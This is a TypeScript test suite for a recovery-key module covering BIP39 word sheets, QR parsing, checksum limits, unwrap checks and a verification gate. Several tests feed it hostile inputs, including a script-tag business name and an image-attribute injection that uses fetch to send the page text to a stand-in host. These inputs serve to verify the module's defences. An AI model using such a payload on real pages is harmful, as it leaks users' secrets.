import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  encodeRoster,
  generateIdentity,
  generateRecoveryKey,
  unwrapWithRecoveryKey,
  wrapUnderRecoveryKey,
  type RosterMemory,
} from '@tally-bridge/crypto';
import { wordlist } from '@scure/bip39/wordlists/english.js';
import {
  VERIFY_WORD_POSITIONS,
  attemptRecovery,
  describeReset,
  makeRecoverySheet,
  makeVerificationChallenge,
  parseRecoveryQr,
  parseRecoveryWords,
  recoverySheetHtml,
} from '../src/onboarding/recovery.ts';

const KEY = new Uint8Array(32).fill(7);

/**
 * A recovery wrap now carries the pinned device roster (see `packages/crypto/src/trust.ts`), so
 * these fixtures must seal one — a roster-less blob is refused by design, and a test suite built
 * on blobs the product refuses to open would be testing a shape that cannot ship.
 *
 * `wrapUnderRecoveryKey` rather than `wrapIdentity` deliberately: this file is about the RECOVERY
 * path, and the primitive uses HKDF where `wrapIdentity` would spend ~475ms of Argon2id on a
 * passphrase none of these tests care about. The cross-wrap agreement rule is `wrapIdentity`'s,
 * and it is tested where it lives, in packages/crypto/test/trust.test.ts.
 */
const ROSTER = encodeRoster({
  version: 1,
  devices: [{ deviceId: 'dev_001', publicKey: new Uint8Array(32).fill(3) }],
});

/** These tests are not about rollback; each one is a first unlock. See `RosterMemory`. */
const FIRST_USE: RosterMemory = { kind: 'first-use' };

/** A real 1x1 PNG data URL. `recoverySheetHtml` validates this argument, so it must be genuine. */
const QR =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

test('a 256-bit key renders as 24 words plus a QR payload', () => {
  const s = makeRecoverySheet(KEY, 'Acme Traders', '2026-07-16');
  assert.equal(s.words.length, 24);
  assert.equal(Buffer.from(s.keyBase64, 'base64').length, 32);
});

test('a key of the wrong size is refused rather than padded', () => {
  assert.throws(() => makeRecoverySheet(new Uint8Array(16), 'X', '2026-07-16'), /32 bytes/);
});

test('THE FULL LOOP: sheet -> typed words -> the same key -> the data opens', async () => {
  // The whole point, end to end: an owner who forgot everything but kept the paper.
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);

  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');
  const typed = parseRecoveryWords(sheet.words.join(' '));
  assert.ok(typed.ok);

  const recovered = await unwrapWithRecoveryKey(blob, typed.key);
  assert.deepEqual(recovered, identity.secretKey);
});

test('the QR path recovers the same key as the words', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const viaQr = parseRecoveryQr(sheet.keyBase64);
  const viaWords = parseRecoveryWords(sheet.words.join(' '));
  assert.ok(viaQr.ok && viaWords.ok);
  assert.deepEqual(viaQr.key, viaWords.key);
});

test('THE CHECKSUM EARNS ITS PLACE: a single misread word is caught', () => {
  // The reason for BIP39 over any 24 words. Without a checksum this would produce a WRONG KEY
  // that fails later as "decryption failed", pointing nowhere near the actual mistake.
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const words = [...sheet.words];
  words[3] = 'zebra'; // a real BIP39 word, in the wrong place
  const r = parseRecoveryWords(words.join(' '));
  assert.ok(!r.ok);
  assert.equal(r.reason, 'checksum');
  assert.match(r.message, /wrong or out of order/);
});

test('a word swap is caught', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const words = [...sheet.words];
  [words[0], words[1]] = [words[1]!, words[0]!];
  const r = parseRecoveryWords(words.join(' '));
  assert.ok(!r.ok);
  assert.equal(r.reason, 'checksum');
});

test('a misread word NAMES the word, rather than saying "invalid"', () => {
  // Someone is squinting at their own printout under a tube light. "Invalid mnemonic" is
  // useless; naming the word is a fix.
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const words = [...sheet.words];
  words[5] = 'qwertyx';
  const r = parseRecoveryWords(words.join(' '));
  // `assert.equal` does not narrow a union for the type checker, so narrow explicitly. This
  // only surfaced once test files started being typechecked at all.
  assert.ok(!r.ok && r.reason === 'unknown_word');
  assert.match(r.message, /"qwertyx" is not one of the recovery words/);
  assert.deepEqual(r.badWords, ['qwertyx']);
});

test('several misread words are all named at once', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const words = [...sheet.words];
  words[1] = 'zzzz';
  words[9] = 'yyyy';
  const r = parseRecoveryWords(words.join(' '));
  assert.ok(!r.ok && r.reason === 'unknown_word');
  assert.deepEqual(r.badWords, ['zzzz', 'yyyy']);
});

test('the wrong number of words is counted for the user', () => {
  const r = parseRecoveryWords('alpha beta gamma');
  assert.ok(!r.ok);
  assert.equal(r.reason, 'wrong_length');
  assert.match(r.message, /24 words.*entered 3/);
});

test('sloppy input is forgiven: case, extra spaces, newlines', () => {
  // People type these from paper. Punishing whitespace would be gratuitous.
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const messy = `  ${sheet.words.join('  \n ').toUpperCase()}  `;
  const r = parseRecoveryWords(messy);
  assert.ok(r.ok);
  assert.deepEqual(r.key, KEY);
});

test('a garbage QR is rejected without throwing', () => {
  for (const s of ['', 'not base64!!!', Buffer.from('short').toString('base64'), 'https://evil.com']) {
    const r = parseRecoveryQr(s);
    assert.ok(!r.ok, `${s} must not parse`);
    assert.match(r.message, /not a recovery key/);
  }
});

// ------------------------------------------------- THE CHECKSUM IS NOT THE AUTHORITY (task #17)

/**
 * Deterministically find a corruption of `words` that PASSES the 8-bit BIP39 checksum.
 *
 * Searched rather than hardcoded: a hardcoded example would be one lucky string that says
 * nothing about the property, which is exactly the mistake this test exists to correct — the
 * claim "the checksum rejects typos" was originally "verified" with ONE example each.
 *
 * The search always succeeds because the checksum is 8 bits: ~1 in 256 substitutions pass, so
 * scanning one position across the 2048-word list yields ~8 survivors.
 */
function typoThatPassesChecksum(words: string[], pos: number): string[] | undefined {
  for (const candidate of wordlist) {
    if (candidate === words[pos]) continue;
    const w = [...words];
    w[pos] = candidate;
    if (parseRecoveryWords(w.join(' ')).ok) return w;
  }
  return undefined;
}

test('MEASURED: the 24-word checksum passes ~1 in 256 single-word typos', () => {
  // The number that makes this whole module's contract necessary. 24 words carry an 8-BIT
  // checksum — not a proof of correctness, a filter that misses ~0.4% of the time. Measured
  // here rather than asserted, so that if anyone ever "upgrades" this to a stronger claim the
  // number in front of them is real.
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  let passed = 0;
  let total = 0;
  for (const candidate of wordlist) {
    if (candidate === sheet.words[3]) continue;
    const w = [...sheet.words];
    w[3] = candidate;
    total++;
    if (parseRecoveryWords(w.join(' ')).ok) passed++;
  }
  const rate = passed / total;
  // 1/256 = 0.39%. Assert the ORDER OF MAGNITUDE, not a fragile exact count.
  assert.ok(passed > 0, 'the checksum must be shown to be fallible, not assumed infallible');
  assert.ok(rate > 0.001 && rate < 0.02, `expected ~0.4% of typos to pass, measured ${(rate * 100).toFixed(2)}%`);
});

test('THE BUG: a checksum-passing typo yields a WRONG KEY that parse calls ok', async () => {
  // This is the false-confidence moment, isolated. `parseRecoveryWords` says ok:true and hands
  // back a key that is NOT the user's key. Any caller that stops here tells ~1 in 250 owners
  // "valid key" and then fails somewhere else entirely.
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const typo = typoThatPassesChecksum(sheet.words, 3);
  assert.ok(typo, 'the search must find one — that it can is the whole point');

  const parsed = parseRecoveryWords(typo.join(' '));
  assert.ok(parsed.ok, 'the checksum does NOT catch this');
  assert.notDeepEqual(parsed.key, KEY, 'and the key it returns is wrong');
});

test('THE FIX: the UNWRAP, not the checksum, is what rejects a checksum-passing typo', async () => {
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const typo = typoThatPassesChecksum(sheet.words, 3);
  assert.ok(typo);
  // Precondition: the pre-filter waves this through.
  assert.ok(parseRecoveryWords(typo.join(' ')).ok, 'precondition: the checksum is fooled');

  const out = await attemptRecovery({ kind: 'words', value: typo.join(' ') }, blob, FIRST_USE);
  assert.equal(out.ok, false, 'a wrong key must NOT recover an identity');
  assert.ok(!out.ok && out.rejectedBy === 'unwrap', 'the AEAD must be the authority, not the checksum');
});

test('a word swap that passes the checksum is also caught by the unwrap', async () => {
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  // Find a swap the checksum misses, scanning pairs deterministically.
  let swapped: string[] | undefined;
  outer: for (let a = 0; a < 24 && !swapped; a++) {
    for (let b = a + 1; b < 24; b++) {
      if (sheet.words[a] === sheet.words[b]) continue;
      const w = [...sheet.words];
      [w[a], w[b]] = [w[b]!, w[a]!];
      if (parseRecoveryWords(w.join(' ')).ok) { swapped = w; break outer; }
    }
  }
  if (!swapped) return; // ~1/256 per pair over 276 pairs; a miss is possible but very unlikely.

  const out = await attemptRecovery({ kind: 'words', value: swapped.join(' ') }, blob, FIRST_USE);
  assert.equal(out.ok, false);
  assert.ok(!out.ok && out.rejectedBy === 'unwrap');
});

test('recovery returns the ROSTER, not just a secret key', async () => {
  // An identity that can decrypt but cannot verify is not a recovered identity: `openSection`
  // requires pinned device keys and has no default, so a bare secret key would leave the owner
  // one fetch away from asking the SERVER which keys to trust — which is the forgery this whole
  // mechanism exists to stop.
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const out = await attemptRecovery({ kind: 'qr', value: sheet.keyBase64 }, blob, FIRST_USE);
  assert.ok(out.ok);
  assert.deepEqual(out.identitySecretKey, identity.secretKey);
  assert.equal(out.rosterVersion, 1);
  assert.deepEqual(out.roster, [{ deviceId: 'dev_001', publicKey: new Uint8Array(32).fill(3) }]);
  assert.equal(out.highestVersionSeen, 1, 'the caller must persist this');
});

test('a ROLLED-BACK wrap is not reported to the owner as a typo', async () => {
  // The words are RIGHT — the AEAD tag verifies — and the bundle behind them is stale. Telling
  // this owner "check your sheet" sends them to re-read a perfect piece of paper forever while
  // an attack goes unreported. Two situations, two sentences.
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER); // version 1
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const out = await attemptRecovery({ kind: 'qr', value: sheet.keyBase64 }, blob, {
    kind: 'seen',
    highestVersionSeen: 4,
  });

  assert.equal(out.ok, false);
  assert.ok(!out.ok);
  assert.equal(out.rejectedBy, 'roster', 'the roster, not the key, is what said no');
  assert.equal(out.action, 'get_help', 'the sheet is not the thing to look at');
  // It must not send the owner back to the paper. Saying their words were RIGHT is the whole
  // point — what it must never do is imply the fix is to look at the sheet again, which is what
  // every other failure in this module correctly says.
  assert.doesNotMatch(out.message, /check (them|your)|against your|in order|scan the/i);
  assert.doesNotMatch(out.message, /decrypt|cipher|AEAD|poly1305|roster|version/i, 'no jargon either');
});

test('a wrap with no roster fails recovery loudly rather than recovering a useless identity', async () => {
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk); // no roster
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const out = await attemptRecovery({ kind: 'qr', value: sheet.keyBase64 }, blob, FIRST_USE);
  assert.equal(out.ok, false);
  assert.ok(!out.ok && out.rejectedBy === 'roster');
  assert.equal(out.action, 'get_help');
});

test('THE HAPPY PATH still works: the right words recover the identity', async () => {
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const out = await attemptRecovery({ kind: 'words', value: sheet.words.join(' ') }, blob, FIRST_USE);
  assert.ok(out.ok, 'a correct sheet must recover');
  assert.deepEqual(out.identitySecretKey, identity.secretKey);
});

test('the QR path is equally authoritative: a well-formed but WRONG key is refused', async () => {
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);

  // A perfectly valid 32-byte base64 key — it just is not THIS dashboard's key. The QR parser
  // cannot possibly know that; only the unwrap can.
  const otherKey = await generateRecoveryKey();
  const otherSheet = makeRecoverySheet(otherKey, 'Someone Else', '2026-07-16');
  assert.ok(parseRecoveryQr(otherSheet.keyBase64).ok, 'precondition: it parses fine');

  const out = await attemptRecovery({ kind: 'qr', value: otherSheet.keyBase64 }, blob, FIRST_USE);
  assert.equal(out.ok, false);
  assert.ok(!out.ok && out.rejectedBy === 'unwrap');

  const right = await attemptRecovery({ kind: 'qr', value: makeRecoverySheet(rk, 'A', '2026-07-16').keyBase64 }, blob, FIRST_USE);
  assert.ok(right.ok);
});

test('NO STACK TRACE EVER REACHES THE OWNER: both failure modes read as plain sentences', async () => {
  // ARCHITECTURE.md's rule. A checksum failure and an unwrap failure are the SAME situation to
  // a non-technical owner — the words are not right — so they must read alike. The unwrap path
  // is the one at risk: it is a caught crypto exception, and the temptation is to echo it.
  const identity = await generateIdentity();
  const rk = await generateRecoveryKey();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, rk, ROSTER);
  const sheet = makeRecoverySheet(rk, 'Acme', '2026-07-16');

  const wrongWords = makeRecoverySheet(await generateRecoveryKey(), 'X', '2026-07-16').words;
  const badChecksum = [...sheet.words];
  badChecksum[3] = badChecksum[3] === 'zebra' ? 'zoo' : 'zebra';

  const outcomes = [
    await attemptRecovery({ kind: 'words', value: wrongWords.join(' ') }, blob, FIRST_USE),
    await attemptRecovery({ kind: 'words', value: badChecksum.join(' ') }, blob, FIRST_USE),
    await attemptRecovery({ kind: 'qr', value: 'WIFI:T:WPA;S:OfficeNetwork;P:hunter2;;' }, blob, FIRST_USE),
    await attemptRecovery({ kind: 'words', value: 'alpha beta gamma' }, blob, FIRST_USE),
  ];

  for (const o of outcomes) {
    assert.equal(o.ok, false);
    assert.ok(!o.ok);
    // No jargon, no internals, no exception text.
    assert.doesNotMatch(o.message, /decrypt|cipher|AEAD|chacha|poly1305|tag|Error|undefined|null/i);
    // One plain sentence, and exactly one thing to do about it.
    assert.ok(o.message.length > 0 && o.message.length < 220, 'one sentence, not a paragraph');
    assert.equal(o.action, 'check_the_sheet');
  }
});

test('attemptRecovery NEVER says "valid key" on the checksum alone', async () => {
  // The regression guard for task #17. The ONLY route to ok:true is a verified AEAD tag, so a
  // key that parses but does not unwrap must never be reported as success.
  const identity = await generateIdentity();
  const blob = await wrapUnderRecoveryKey(identity.secretKey, await generateRecoveryKey(), ROSTER);

  // 24 words that are perfectly well-formed and completely unrelated to this blob.
  for (let i = 0; i < 5; i++) {
    const strangerSheet = makeRecoverySheet(await generateRecoveryKey(), 'X', '2026-07-16');
    assert.ok(parseRecoveryWords(strangerSheet.words.join(' ')).ok, 'the checksum is happy');
    const out = await attemptRecovery({ kind: 'words', value: strangerSheet.words.join(' ') }, blob, FIRST_USE);
    assert.equal(out.ok, false, 'a well-formed WRONG sheet must never be accepted');
  }
});

// ---------------------------------------------------------------- verification gate

test('THE FORCED GATE: verification asks for the printed word positions', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const c = makeVerificationChallenge(sheet);
  assert.deepEqual(c.positions, [...VERIFY_WORD_POSITIONS]);
  // 1-indexed, matching what is printed on the sheet — off-by-one here would fail every
  // honest user and be maddening to diagnose.
  assert.ok(c.check([sheet.words[3]!, sheet.words[16]!]));
});

test('verification rejects wrong answers', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const c = makeVerificationChallenge(sheet);
  assert.equal(c.check(['wrong', 'wrong']), false);
  assert.equal(c.check([sheet.words[3]!, 'wrong']), false);
  assert.equal(c.check([]), false, 'skipping is not passing');
  assert.equal(c.check([sheet.words[3]!]), false, 'a partial answer is not passing');
});

test('verification is case- and whitespace-insensitive', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const c = makeVerificationChallenge(sheet);
  assert.ok(c.check([` ${sheet.words[3]!.toUpperCase()} `, sheet.words[16]!]));
});

test('verification cannot be passed by answering in the wrong order', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme', '2026-07-16');
  const c = makeVerificationChallenge(sheet);
  // Word 17 given as the answer to word 4 must fail — otherwise the check proves nothing about
  // whether they can read their own sheet.
  const swapped = c.check([sheet.words[16]!, sheet.words[3]!]);
  assert.equal(swapped, sheet.words[16] === sheet.words[3], 'only passes if the words coincide');
});

// ---------------------------------------------------------------- the sheet

test('the printed sheet carries everything needed to use it a year later', () => {
  const sheet = makeRecoverySheet(KEY, 'Acme Traders', '2026-07-16');
  const html = recoverySheetHtml(sheet, 'data:image/png;base64,AAAA');

  assert.match(html, /Acme Traders/, 'a drawer accumulates these');
  assert.match(html, /2026-07-16/);
  assert.match(html, /@page \{ size: A4/, 'A4, not Letter — this market prints A4');
  for (const w of sheet.words) assert.ok(html.includes(w), `word "${w}" must be printed`);
  assert.match(html, /Scan this to recover/, 'QR is the primary path');
  assert.match(html, /data:image\/png;base64,AAAA/);
});

test('the sheet prints the honest reassurance, because paper outlives the UI', () => {
  const html = recoverySheetHtml(makeRecoverySheet(KEY, 'Acme', '2026-07-16'), QR);
  // The de-risking fact: Tally is the source of truth, so total key loss is an inconvenience.
  assert.match(html, /rebuilt from Tally/);
  assert.match(html, /Keep this paper safe/);
  // And the honest warning, not buried.
  assert.match(html, /Anyone holding this sheet can read your dashboard/);
});

test('a business name cannot inject markup into the printed sheet', () => {
  // The company name comes from Tally, i.e. from a file we do not control.
  const sheet = makeRecoverySheet(KEY, '<script>alert(1)</script>', '2026-07-16');
  const html = recoverySheetHtml(sheet, QR);
  assert.ok(!html.includes('<script>alert(1)</script>'));
  assert.match(html, /&#60;script&#62;/);
});

test('the words are numbered 1..24 as printed', () => {
  const html = recoverySheetHtml(makeRecoverySheet(KEY, 'A', '2026-07-16'), QR);
  for (const n of [1, 4, 17, 24]) {
    assert.ok(html.includes(`<span class="n">${n}</span>`), `position ${n} must be numbered`);
  }
});

// ---------------------------------------------------------------- reset

test('THE RESET IS HONEST, which is what makes it usable', () => {
  // An owner told "you will lose everything" does not click, and becomes a ticket nobody can
  // close. Told the truth, they click and are unblocked in a minute.
  const r = describeReset();
  assert.match(r.body, /rebuilt from Tally/);
  assert.match(r.body, /lose only the dashboard/);
  assert.doesNotMatch(r.body, /permanent|irreversible|destroy|warning/i, 'no manufactured terror');
  assert.match(r.confirmLabel, /Start again/);
  assert.doesNotMatch(r.title, /delete|wipe|erase/i);
});

// ---------------------------------------------------------------- ADVERSARIAL: the QR is an input

test('a QR from a DIFFERENT app is not accepted as a recovery key', () => {
  // `Buffer.from(s, "base64")` silently DISCARDS every character outside the base64 alphabet
  // rather than failing. So any scanned string with enough incidental base64-ish characters
  // decodes to 32 bytes and sails through the length check. A WiFi QR taped inside the office
  // cupboard is the realistic one: the owner is told "scan the code", scans the wrong sticker,
  // and gets a confidently wrong key. The failure then surfaces as "decryption failed" pointing
  // nowhere — the exact outcome this module exists to prevent.
  const foreign = 'WIFI:T:WPA;S:OfficeNetwork;P:SuperSecret123456789;;';
  const r = parseRecoveryQr(foreign);
  assert.equal(r.ok, false, 'a WiFi QR must not be mistaken for a recovery key');
});

test('a QR payload with junk spliced into it is refused, not silently repaired', () => {
  // Lenient decoding also means a corrupted scan can be "repaired" into a key. Whether the
  // repair happens to be right is luck; accepting it at all is the bug.
  const s = makeRecoverySheet(KEY, 'A', '2026-07-16');
  const mangled = `${s.keyBase64.slice(0, 10)}!!!!${s.keyBase64.slice(10)}`;
  assert.equal(parseRecoveryQr(mangled).ok, false, 'non-canonical base64 must be refused');
});

test('a valid QR still round-trips exactly', () => {
  const s = makeRecoverySheet(KEY, 'A', '2026-07-16');
  const r = parseRecoveryQr(s.keyBase64);
  assert.ok(r.ok);
  assert.deepEqual(r.key, KEY);
  // Whitespace from a scanner is not corruption.
  const padded = parseRecoveryQr(`  ${s.keyBase64}\n`);
  assert.ok(padded.ok);
});

// ---------------------------------------------------------------- ADVERSARIAL: qrDataUrl injection

test('the QR data URL cannot inject attributes into the printed sheet', () => {
  // `qrDataUrl` was interpolated raw into `<img src="${qrDataUrl}">`. escapeHtml was applied to
  // every OTHER interpolation, which is what made this easy to miss. A quote closes the
  // attribute and everything after it is markup.
  const sheet = makeRecoverySheet(KEY, 'A', '2026-07-16');
  const evil = 'data:image/png;base64,AAAA" onerror="fetch(`https://x.test/?k=`+document.body.innerText)" x="';
  assert.throws(
    () => recoverySheetHtml(sheet, evil),
    /QR/i,
    'a data URL that is not a plain image payload must be refused',
  );
});

test('the printed sheet accepts a real QR data URL', () => {
  const sheet = makeRecoverySheet(KEY, 'A', '2026-07-16');
  const real = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  const html = recoverySheetHtml(sheet, real);
  assert.ok(html.includes(real), 'a legitimate QR must survive verbatim');
});

// ---------------------------------------------------------------- ADVERSARIAL: the gate

test('THE GATE: a missing answer never counts as a correct answer', () => {
  // `answers[i]?.trim().toLowerCase() === sheet.words[pos - 1]` compares undefined to undefined
  // and calls it a match. It needs a sheet whose words array is shorter than position 17 — a
  // truncated restore, a bad IPC payload, a driver bug — but the gate is the one thing in this
  // product that claims to be unskippable, so it must not depend on its input being well-formed.
  const short = { words: ['a', 'b', 'c', 'four'], keyBase64: 'x', businessName: 'B', createdOn: 'd' };
  const ch = makeVerificationChallenge(short as never);
  assert.equal(ch.check(['four', undefined as never]), false, 'undefined must not satisfy the gate');
  assert.equal(ch.check(['four', null as never]), false, 'null must not satisfy the gate');
  assert.equal(ch.check(['four', '']), false);
});

test('THE GATE: a well-formed sheet still verifies normally', () => {
  const sheet = makeRecoverySheet(KEY, 'A', '2026-07-16');
  const ch = makeVerificationChallenge(sheet);
  const right = VERIFY_WORD_POSITIONS.map((p) => sheet.words[p - 1]!);
  assert.equal(ch.check(right), true);
  assert.equal(ch.check(right.map((w) => ` ${w.toUpperCase()} `)), true, 'case and spacing are typos, not failures');
  assert.equal(ch.check([right[0]!, 'wrong']), false);
});
